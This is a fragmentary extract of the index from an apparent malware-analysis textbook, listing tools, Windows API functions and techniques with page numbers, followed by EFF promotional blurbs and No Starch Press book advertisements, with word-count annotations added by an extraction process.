main method and offsets, in x86 
architecture, 83–84
pseudocode for process 
replacement, 258
standard library, IDA Pro catalog 
of named constants, 102
The C Programming Language 
(Kernighan and Ritchie), 110
C++ analysis, 427–438
labs, 439–440
solutions, 712–723
[Word Count: 100]

hash dumping, 236–238
keystroke logging, 238–241
cross-references (xref), 124
checking for gethostbyname, 495
for global variables, 547
graphs of, 98, 99
for function, 498
for installer export, 572–573
in IDA Pro, 95–97
adding missing code, 342
navigating, 92–93
and virtual functions, 436
CryptAcquireContext function, 455
cryptographic algorithms, 280–285
recognizing strings and imports, 
281–282
search for cryptographic constants, 
282–283
search for high-entropy content, 
283–285
cryptography, drawbacks, 281
CWSandbox, 40
[Word Count: 68]

da command, in WinDbg, 210
data
hard-coded vs. ephemeral, 314–315
overlaying onto structure, 214
Python script for converting to 
string, 500–501
redefining in IDA Pro, 103
data buffers, instructions for 
manipulating, 81
data cross-references, 96–97
data encoding, 269–294
cryptographic algorithms, 280–285
recognizing strings and imports, 
281–282
search for cryptographic 
constants, 282–283
search for high-entropy content, 
283–285
custom, 285–288
decoding, 288–294
instrumentation for generic 
decryption, 291–294
manual programming of 
functions, 289–290
self-decoding, 288–289
[Word Count: 72]

Process Monitor (procmon), 43–46
running malware, 42–43
sandboxes, 40–42
drawbacks, 41–42
dynamic link libraries (DLLs), 12, 17, 
145–147
analyzing in IDA Pro, 521–525
base address different from 
preferred, 88
basic structure, 146–147
Detours to add new to existing 
binaries, 262
injection, 254–257
debugger view, 256
launching, 42
loading in OllyDbg, 191–192
load-order hijacking, for 
persistence, 244–245
malware as, 42
memory addresses for, 184–185
memory map to locate, 546–547
packed, 401
Process Explorer for finding 
injection, 589
dynamic linking, 16
dynamic unpacking programs, 
automated, 389
dynamically linked functions, explor-
ing with Dependency Walker, 
16–17
[Word Count: 93]

EA (effective address), in IDAPython 
scripts, 105
Eagle, Chris, The IDA Pro Book, 88
EAT (export address table), hooking 
method and, 248
EAX register, 75, 646
EBP register, 77
ECB (Electronic Code Book), 626
Eckel, Bruce, Thinking in C++, 428
ECX register, this parameter and, 429
.edata section, in PE file, 22
EDI register, 81
EDX register, 75
effective address (EA), in IDAPython 
scripts, 105
EFLAGS register, 72
EIP (instruction pointer), 73
[Word Count: 72]

fake services, 55
FakeDNS, 469
faking networks, 51–53
Netcat (nc) for monitoring, 52–53
false positives, in Snort, 306
Fast Library Identification and 
Recognition Technology 
(FLIRT), 88
signature detection, 541
[Word Count: 29]

disassembly and memory 
dump, 174
executable import by ordinal, 
16–17, 43
executable use of, 15–18
exported, 18
finding connection between, 622
finding that installs hook, 223
graphing cross-references, 498
graphs of calls, 98
hard-coded locations for calls, 410
identifying at stored memory 
location, 695
imported, 18, 19
naming conventions, 17
overloading in object-oriented 
programming, 430–431
program termination by, 656–657
recursive, 527
search for information on, 19
stepping-over vs. stepping-into, 
394–395
virtual vs. nonvirtual, 432–436
vtables, 434–435
Functions window, in IDA Pro, 91
[Word Count: 82]

g (go) command, in WinDbg, 211
GCC (GNU Compiler Convention), 
calling conventions, 121
GDI32.dll, 17
importing from, 20
GDT (global descriptor table), 374
GDT register (GDTR), 374
general registers, 71–72
in x64 architecture, 443
GET request, 309
and malicious activity, 299
malware construction of, 539
GetAdaptersInfo function, 456
dynamic resolution, 680
getaddrinfo function, 313
GetAsyncKeyState function, 239, 457, 
581, 585
GetCommandLineA function, 395
breakpoint on, 400
getContent function, 615
GetCurrentProcessId function, 547
GetCurrentThreadId function, 575
[Word Count: 75]

graph mode, in IDA Pro, 89–90, 
98–99
Graphical Identification and Authen-
tication (GINA) interception, 
235–236
indications of, 567–571
Gray Hat Python (Seitz), 201
GUI manipulation functions, 20
GUI programs, 
IMAGE_SUBSYSTEM_WINDOWS_GUI 
value for, 23
GUIDs (globally unique identifiers), 
155
[Word Count: 38]

IsWow64Process function, 448, 459
effort to dynamically resolve, 
729–730
Itanium, 441
IWebBrowser2 interface, Navigate 
function, 155
[Word Count: 16]

JavaScript
in PDF files, 704–705
to profile user’s system, 423
jmp instruction, 80, 329, 517
consecutive in IDA Pro, 335
with constant condition, 336
with same target, 334–335
jnz instruction, 408–409
Joe Sandbox, 40
jump instructions, 386
jump table, for switch structure, 
641–642
jumping to location, in IDA Pro, 
93–94
just-in-time debugger, 411
OllyDbg as, 696
jz instruction, 653
false conditional for, 647–648
target of, 646
[Word Count: 66]

KANAL (Krypto ANALyzer), 283, 
610, 619
KeInitializeApc function, 264–265
KeInsertQueueApc function, 264–265
kernel-based keyloggers, 238
kernel code, 206
64-bit malware and, 442
breakpoints, 548
malware creation of file, 554
kernel debugging
looking at user-space code, 
215–216
setting up for VMware, 207–210
WinDbg and, 205
kernel driver, creating service to 
load, 216
kernel mode
binary translation by VMware, 373
for debuggers, vs. user mode, 
168–169
in Windows, 158–159
[Word Count: 67]

lab environments, malware and, 298
labeling, in OllyDbg, 197
labs
64-bit malware, 450–451
solutions, 723–732
anti-debugging, 367–368
solutions, 655–669
anti-disassembly, 350
solutions, 645–655
anti-virtual machine (anti-VM) 
techniques, 381–382
solutions, 670–684
C++ analysis, 439–440
solutions, 712–723
[Word Count: 35]

loops
in C code, 116–118
setting breakpoints after, 394
LordPE, 469
LowLevelKeyboardProc export, 20
low-level language level, 66, 67
LowLevelMouseProc export, 20
low-level remote hooks, 260
LsaEnumerateLogonSessions function, 459
lsaext.dll, 236
LSASS (Local Security Authority Sub-
system Service) process, 236
lsass.exe, 236
LUIDs (locally unique identifiers), 238
[Word Count: 47]

named constants, 102–103
named pipes, watching for 
input on, 634
names
conventions for functions, 17
hashed exported, for symbol 
resolution, 417–418
for lab files, 27
of locations, changing in 
IDA Pro, 100
for malicious DLL, 257
of malware, string comparison, 666
mangling in C++, 431
[Word Count: 45]

NULL terminator, 11
Number of Opcode Bytes option, 335
NXDOMAIN option, 52
[Word Count: 12]

transferring execution to, 386
unpacking stub and, 384
orphaned process, 490–491
OSR Driver Loader, 470–471
OSs (operating systems), backup 
images of, 30
Outlook Express, 579–580
output functions, tracing from, 286
OutputDebugString function, 353, 
460, 664
overanalysis, danger of, 308
overloading, 430–431
[Word Count: 41]

query, of I/O communication port, 
375–377
QueryPerformanceCounter function, 
358–359, 460, 667–668
QueueUserAPC function, 263, 460
[Word Count: 15]

radio-frequency identification (RFID) 
tokens, 235
RaiseException function, 157, 344
[Word Count: 9]

rtutils.dll, comparing trojanized and 
clean versions, 243
rule options, in Snort, 303
Run subkey, for running programs 
automatically, 140
run trace, in OllyDbg, 193
rundll32.exe, 42–43, 488
filter for process, 572
for running DLL malware, 42–43
running process, attaching 
OllyDbg to, 181
running services, listing, 152
runtime linking, 15
RVAs (relative virtual addresses), for 
PE files, 416
[Word Count: 57]

safe environment, 29. See also virtual 
machines
SafeSEH, 345
SAM (Security Account Manager), 
password hashes of local user 
accounts, 236
SamIConnect function, 237, 461
SamIGetPrivateData function, 237, 461
SamQueryInformationUse function, 461
SamrQueryInformationUser function, 237
samsrv.dll library, obtaining 
handle to, 237
sandboxes, 40–42, 473
Sandboxie, 473
sc command, 555
scareware, 4
scasb instruction, 82
scasx instruction, 81
ScoopyNG, 379
screen capture, function for, 615
ScreenEA function, 105
scriptable debugging, in OllyDbg, 
200–201
scripts, IDC, 104–105
searching
default order for loading DLLs in 
Windows XP, 245
in IDA Pro, 94–95
for symbols, 212–213
Section Hop, 391
Secure Hash Algorithm 1 (SHA-1), 10
[Word Count: 100]

symbolic links, creating, 562
symbols, 212–215
configuring, 215
searching for, 212–213
and viewing structure information, 
213–214
SYSCALL instruction, 158, 221
SYSENTER instruction, 158
Sysinternals, Autoruns program, 241
SYSTEM account, 152
system binaries, trojanized, for 
persistence, 243–244
system calls, filtering on, 45
system function, 462
system memory. See memory
system residue, checking for, 356
System Service Descriptor Table 
(SSDT)
checking for, 222
hooking, 221–222
SystemFunction025 function, 237
SystemFunction027 function, 237
SYSTEMTIME structure, 516
SystemTimeToFileTime function, 516
[Word Count: 75]

tail jump, 386
eliminating code as, 693
examining code for, 687–688
and finding OEP, 392
for program packed with 
UPack, 399
targeted malware, 4
targeted phishing, 299
TCP handshake, capturing, 59
TCPView, 473
TEB (Thread Environment Block), 344
TerminateProcess function, IAT 
hooking of, 248
test instruction, 80
text mode, in IDA Pro, 90–91
.text section, in PE file, 21, 22
TF (trap) flag, 72
The Sleuth Kit (TSK), 473
Themida, 400
Thinking in C++ (Eckel), 428
this pointer, 428–430, 712–713, 719
in disassembly, 430
thread context, 149
[Word Count: 87]

u (unassemble) command, 
in WinDbg, 212
Ultimate Packer for eXecutables. See 
UPX (Ultimate Packer for 
eXecutables)
[Word Count: 16]

user32.dll, 17, 20, 545
User-Agent, 312, 317
dynamically generated, 511
for malware, 303, 310, 628
string for signature, 643
user-mode APC, 263
user-mode rootkits, 247–250
IAT hooking, 248
inline hooking, 248–250
[Word Count: 31]

W, at end of Windows function 
name, 17
WaitForMultipleObjectsEx function, 263
[Word Count: 11]

WSASocket function, 542, 727
WSAStartup function, 144, 313, 463, 
542, 727
wshtcpip.dll, 483
WSock32.dll, 17
wupdmgr.exe, 604
launching, 606
[Word Count: 19]

x command, WinDbg, 213
x64 architecture, 441
differences in calling convention 
and stack usage, 443–447
exception handling, 445
malware with component for, 729
x64 Windows, kernel issues for, 
226–227
x86-64 architecture, 441
x86 architecture, 68–85
branching, 80–81
C main method and offsets, 83–84
code types and data access, 408
conditionals, 80
documentation manuals, 85
instructions, 69–70
instruction set, general-purpose 
register for, 409
main memory, 69
NOP instruction, 76
opcodes and endianness, 70
operands, 70
registers, 71–73, 374
rep instructions, 81–83
search for vulnerable instructions, 
670–672
simple instructions, 73–76
stack, 77–80
function calls, 77–78
layout, 78–80
[Word Count: 95]

x86 disassembly, 65–85
levels of abstraction, 66–67
reverse-engineer, 67–68
x87 floating-point unit (FPU), 
411–413
Xen, 31
XOR cipher, 271–276
brute-forcing, 271–273
identifying loops in IDA Pro, 
274–276
NULL preserving single-byte, 
273–274
XOR encoded strings, decoding, 
542–543
XOR encoding loop, 620–621
xor instruction, 76, 596
forms, 275
searching for, 612–613
searching for nonzeroing, 608
XOR logical operator, in x86 
architecture, 75
xref. See cross-references (xref)
Xrefs window, in IDA Pro, 96
[Word Count: 70]

Zero Wine, 475
zero-day exploit, 33, 245
ZF (zero) flag, 72, 80
zombies, 234
ZwContinue function, 386
ZwCreateFile function, 219
ZwDeviceIoControlFile function, inline 
hooking of, 249–250
ZwUnmapViewOfSection function, 258
Zynamics BinDiff, 106
[Word Count: 32]

The Electronic Frontier Foundation (EFF) is the leading 
organization defending civil liberties in the digital world. We defend 
free speech on the Internet, fight illegal surveillance, promote the 
rights of innovators to develop new digital technologies, and work to 
ensure that the rights and freedoms we enjoy are enhanced — 
rather than eroded — as our use of technology grows.
[Word Count: 60]

EFF has sued telecom giant AT&T for giving the NSA unfettered access to the 
private communications of millions of their customers.  eff.org/nsa
[Word Count: 22]

EFF’s Coders’ Rights Project is defending the rights of programmers and security 
researchers to publish their findings without fear of legal challenges. 
eff.org/freespeech
[Word Count: 23]

EFF's Patent Busting Project challenges overbroad patents that threaten 
technological innovation. eff.org/patent
[Word Count: 12]

EFF is fighting prohibitive standards that would take away your right to receive and 
use over-the-air television broadcasts any way you choose.  eff.org/IP/fairuse
[Word Count: 23]

EFF has developed the Switzerland Network Testing Tool to give individuals the tools 
to test for covert traffic filtering.  eff.org/transparency
[Word Count: 20]

EFF is working to ensure that international treaties do not restrict our free speech, 
privacy or digital consumer rights.  eff.org/global
[Word Count: 20]

EFF is a member-supported organization. Join Now!  www.eff.org/support
[Word Count: 8]

Visit https://www.nostarch.com/malware/ for updates, errata, and more information.
[Word Count: 8]

BLACK HAT PYTHON
Python Programming for  
Hackers and Pentesters
by justin seitz
[Word Count: 12]

practical packet  
analysis, 3rd edition
Using Wireshark to Solve  
Real-World Network Problems
by chris sanders
[Word Count: 15]

Serious cryptogrpahy
A Practical Introduction to  
Modern Encryption
by jean-philippe aumasson
[Word Count: 11]

attacking network  
protocols
A Hacker’s Guide to Capture,  
Analysis, and Exploitation
by james forshaw
[Word Count: 14]

HACKING, 2ND EDITION
The Art of Exploitation
by jon erickson
[Word Count: 10]

gray hat c#
A Hacker’s Guide to Creating and 
Automating Security Tools 
by brandon perry
[Word Count: 15]

More no-nonsense books from 
No Starch Press
[Word Count: 7]

Total Paragraphs: 4036